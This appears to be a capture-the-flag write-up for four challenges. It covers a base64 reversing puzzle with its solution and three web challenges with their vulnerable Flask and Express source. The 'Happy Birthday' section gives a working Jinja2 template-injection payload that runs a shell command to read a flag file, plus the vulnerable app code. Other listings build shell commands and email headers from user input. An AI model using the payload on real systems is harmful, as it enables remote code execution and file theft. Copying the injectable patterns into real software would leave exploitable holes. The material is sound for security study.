
## Sameer's challenge (reversal)

``` python
import base64

from flag import FLAG

s = ""
for i in range(len(FLAG)):
    if (i % 4) == 0:
        s += base64.b64encode(FLAG[i].encode("ascii")).decode("ascii")
    else:
        s += FLAG[i]

print(s)

assert s[0] == "Q"
assert s[1] == "Q"
assert s[20] == "_"
assert s[4] == "S"
assert s[5] == "V"
assert s[29] == "w"
assert s[7] == "d"
assert s[23] == "="
assert s[24] == "="
assert s[25] == "o"
assert s[8] == "w"
assert s[15] == "A"
assert s[16] == "="
assert s[17] == "="
assert s[18] == "m"
assert s[9] == "="
assert s[30] == "="
assert s[31] == "="
assert s[32] == "}"
assert s[10] == "="
assert s[11] == "3"
assert s[12] == "l"
assert s[13] == "c"
assert s[14] == "M"
assert s[2] == "="
assert s[3] == "="
assert s[19] == "3"
assert s[28] == "M"
assert s[21] == "d"
assert s[22] == "A"
assert s[6] == "{"
assert s[26] == "_"
assert s[27] == "R"
```

Solution
``` python
# assert s[0] == "Q"
# assert s[1] == "Q"
# assert s[2] == "="
# assert s[3] == "="
## A
# assert s[4] == "S"
# assert s[5] == "V"
# assert s[6] == "{"
## ASV{
# assert s[7] == "d"
# assert s[8] == "w"
# assert s[9] == "="
# assert s[10] == "="
## ASV{w
# assert s[11] == "3"
# assert s[12] == "l"
# assert s[13] == "c"
## ASV{w3lc
# assert s[14] == "M"
# assert s[15] == "A"
# assert s[16] == "="
# assert s[17] == "="
## ASV{w3lc0
# assert s[18] == "m"
# assert s[19] == "3"
# assert s[20] == "_"
## ASV{w3lc0m3_
# assert s[21] == "d"
# assert s[22] == "A"
# assert s[23] == "="
# assert s[24] == "="
## ASV{w3lc0m3_t
# assert s[25] == "o"
# assert s[26] == "_"
# assert s[27] == "R"
## ASV{w3lc0m3_to_R
# assert s[28] == "M"
# assert s[29] == "w"
# assert s[30] == "="
# assert s[31] == "="
## ASV{w3lc0m3_to_R3}
# assert s[32] == "}"
```

## Happy Birthday (web)

HTTP Request
```
name={{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("cat+/flag.txt").read()}}
```

HTTP Response
```
 <h1 class="turt-header">
 Happy Birthday 
 ASV{f31d34e2b726b385741db15fec005661}!
 </h1>
```

### app.py
``` python
from flask import Flask, request, render_template
from jinja2 import Environment

app = Flask(__name__)
Jinja2 = Environment()

@app.route('/',methods=['GET', 'POST'])
def home_page():
    if request.method == 'GET':
        output = "Birthday Card Generator"
        is_value = False
        return  render_template('home.html', output=output,is_value=is_value)
    else:
        name = request.values.get('name', None)
        output = Jinja2.from_string('Happy Birthday ' + name + '!').render()
        is_value = True
        return render_template('home.html', output=output,is_value=is_value)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

## Fr33 Storage (web)

``` js
var express = require('express');
var fs = require('fs');
var crypto = require('crypto');
const http = require('http');
const https = require('https');
const cookieParser = require("cookie-parser");
const { exec } = require('child_process'); 


// Certificate
const privateKey = fs.readFileSync('/etc/letsencrypt/live/fr33-storage.ml/privkey.pem', 'utf8');
const certificate = fs.readFileSync('/etc/letsencrypt/live/fr33-storage.ml/cert.pem', 'utf8');
const ca = fs.readFileSync('/etc/letsencrypt/live/fr33-storage.ml/chain.pem', 'utf8');

const credentials = {
	key: privateKey,
	cert: certificate,
	ca: ca
};

var app = express();

app.use(express.json());
app.use(cookieParser());
app.disable('x-powered-by');


/*** Routes ***/
app.get('/', function (req, res) {
	
	try { var dir = parseCookies(req)['dir'].replace(/\.|\//gi, "");} catch (error) {}
		
	if(!dir || !fs.existsSync("./dirs/" + dir)){
		res.cookie('dir',getDir(), { maxAge: 900000, httpOnly: true })
	}
    res.send('<html><title>Secure fr33 storage</title><body><h1>Endpoints:</h1><ul>GET   /list</ul><ul>POST  /upload       Content-Type: application/json      {"filename": "", "content": ""}</ul><ul>POST  /download     Content-Type: application/json      {"filename": ""}</ul><ul>POST  /delete       Content-Type: application/json      {"filename": ""}</ul><ul>GET   /downloadAll</ul><ul>GET   /deleteAll</ul></body></html>');
});  

app.get('/list', function (req, res) {
	
	try { var dir = parseCookies(req)['dir'].replace(/\.|\//gi, "");} catch (error) {}
	
	if(!/^[a-z0-9]*$/.test(dir) || !fs.existsSync("./dirs/" + dir)){
		res.send("This directory doesn't exist!");
		return;
	}
	
	var files = {"files": []}
	fs.readdirSync("./dirs/" + dir).forEach(file => {
		files['files'].push(file);
	});

    res.send(files);
});

app.post('/upload', function (req, res) {
	
	try { var dir = parseCookies(req)['dir'].replace(/\.|\//gi, "");} catch (error) {}
	 
	if(!/^[a-z0-9]*$/.test(dir) || !fs.existsSync("./dirs/" + dir)){
		res.send("This directory doesn't exist!");
		return;
	}
	
    var filename = req.body.filename
	var content = req.body.content
	
	if (typeof(filename) == "undefined" || typeof(content) == "undefined"){
		res.send("'filename' or 'content' param is missing");
		return;
	}
	
	filename = filename.replace(/\.|\//gi, "");

	fs.writeFile("./dirs/" + dir + "/" + filename, content, function (err) {if (err) res.send(err); return;});
	
    res.send("The file has been uploaded!");
});

app.post('/delete', function (req, res) {
	
	try { var dir = parseCookies(req)['dir'].replace(/\.|\//gi, "");} catch (error) {}
	
	if(!/^[a-z0-9]*$/.test(dir) || !fs.existsSync("./dirs/" + dir)){
		res.send("This directory doesn't exist!");
		return;
	} 
	
    var filename = req.body.filename
	
	if (typeof(filename) == "undefined"){
		res.send("'filename' or 'content' param is missing");
		return
	}
	
	filename = filename.replace(/\.|\//gi, "");
    
	if(!fs.existsSync("./dirs/" + dir + "/" + filename)){
		res.send("The file doesn't exist!");
		return;
	}
	
	fs.unlink("./dirs/" + dir + "/" + filename, (err) => {if (err) {res.send(err); return;}})
	
    res.send("The file was deleted!");
});

app.post('/download', function (req, res) {
	
	try { var dir = parseCookies(req)['dir'].replace(/\.|\//gi, "");} catch (error) {}
	
	if(!/^[a-z0-9]*$/.test(dir) || !fs.existsSync("./dirs/" + dir)){
		res.send("This directory doesn't exist!");
		return;
	}
	
	var filename = req.body.filename
	
	if (typeof(filename) == "undefined"){
		res.send("'filename' or 'content' param is missing");
		return;
	}
	
	filename = filename.replace(/\.|\//gi, ""); 
	
	if(!fs.existsSync("./dirs/" + dir + "/" + filename)){
		res.send("The file doesn't exist!");
		return;
	}
	
    res.download("./dirs/" + dir + "/" + filename);
});

app.get('/deleteAll', function (req, res) {
	
	try { var dir = parseCookies(req)['dir'].replace(/\.|\//gi, "");} catch (error) {}
	
	if(!/^[a-z0-9]*$/.test(dir) || !fs.existsSync("./dirs/" + dir)){
		res.send("This directory doesn't exist!");
		return;
	}
    
	dir = "./dirs/" + dir + "/"
	exec('cd ' + dir + ';rm -R *;', (err, stdout, stderr) => {callback(stdout);});
	
    res.send("All files were deleted!");
});

app.get('/downloadAll', function (req, res) {
	
	try { var dir = parseCookies(req)['dir'].replace(/\.|\//gi, "");} catch (error) {}
	
	if(!/^[a-z0-9]*$/.test(dir) || !fs.existsSync("./dirs/" + dir)){
		res.send("This directory doesn't exist!");
		return;
	} 

	dir = "./dirs/" + dir + "/"
	exec('rm files.tar;cd ' + dir + ';tar -cf files.tar * 2>/dev/null >/dev/null;', (err, stdout, stderr) => {});

	res.download(dir + "files.tar");
    
});



app.get('/fd3254118905c2c41d430f4b93703b', function(req, res){
  const file = `./app.js`;
  res.download(file); 
});


/*** Utils ***/

function getDir(){
	var dir = crypto.randomBytes(20).toString('hex');
	
	if (!fs.existsSync("./dirs/" + dir)){
		fs.mkdirSync("./dirs/" + dir, { recursive: true });
	}
	
	return dir;
}


function parseCookies(request) {
    var list = {},
        rc = request.headers.cookie;

    rc && rc.split(';').forEach(function( cookie ) {
        var parts = cookie.split('=');
        list[parts.shift().trim()] = decodeURI(parts.join('='));
    });

    return list;
}



/*** Start server ***/
const httpServer = http.createServer(app);
const httpsServer = https.createServer(credentials, app);


httpServer.listen(80, () => {
	console.log('HTTP Server running on port 80');
});

httpsServer.listen(443, () => {
	console.log('HTTPS Server running on port 443');
});
```

## Postmaster(web)
``` python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import flask
import re
import smtplib

# This is just the regex browsers use for <input type="email">
EMAIL_REGEX = re.compile(
    r'^[a-zA-Z0-9.!#$%&\'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}'
    r'[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$'
)

app = flask.Flask(__name__)
app.config.from_object('config')


@app.route('/send_email', methods=['POST'])
def send_email():
    name = flask.request.form['name']
    email_address = flask.request.form['email']

    if '\n' in name or '\r' in name:
        return flask.redirect('/?m=badname')
    if not EMAIL_REGEX.match(email_address):
        return flask.redirect('/?m=bademail')

    mail = MIMEMultipart('alternative')
    mail['From'] = 'postmaster.boats <noreply@postmaster.boats>'
    mail['To'] = name + ' <' + email_address + '>'
    if email_address == 'admin@email.invalid':
        mail['Subject'] = 'Flag'
        mail.attach(MIMEText(app.config['FLAG'], 'plain'))
    else:
        mail['Subject'] = 'Sorry, try again'
        mail.attach(MIMEText('No flag for you :(', 'plain'))

    smtp_client = smtplib.SMTP(timeout=2)
    smtp_client.connect('localhost')
    smtp_client.send_message(mail)

    return flask.redirect('/?m=sent')


@app.route('/source')
def source():
    with open(__file__) as this_file:
        return this_file.read(), {'Content-Type': 'text/plain'}


@app.route('/')
def home():
    return flask.render_template('home.html')


if __name__ == '__main__':
    app.run(debug=True, port=8080)
```
